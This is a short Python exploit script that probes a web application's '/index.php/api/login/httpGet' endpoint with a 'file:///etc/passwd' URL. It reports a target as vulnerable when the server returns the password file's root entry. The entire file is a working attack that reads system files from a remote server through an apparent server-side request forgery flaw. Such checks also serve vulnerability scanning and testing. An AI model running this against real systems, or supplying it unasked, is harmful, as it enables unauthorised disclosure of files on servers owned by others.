import requests

def exp(url):
    vuln_url = url + '/index.php/api/login/httpGet?url=file:///etc/passwd'
    try:
        res = requests.get(vuln_url, timeout=5)
        if res.status_code == 200 and 'root:x:0:0:root' in res.text:
            print('[+] {} is vulnerable'.format(url))
            return True
        else:
            print('[-] {} is not vulnerable'.format(url))
            return False
    except Exception as e:
        print('[-] {} is not vulnerable'.format(url))

if __name__ == '__main__':
    url = ''
    exp(url)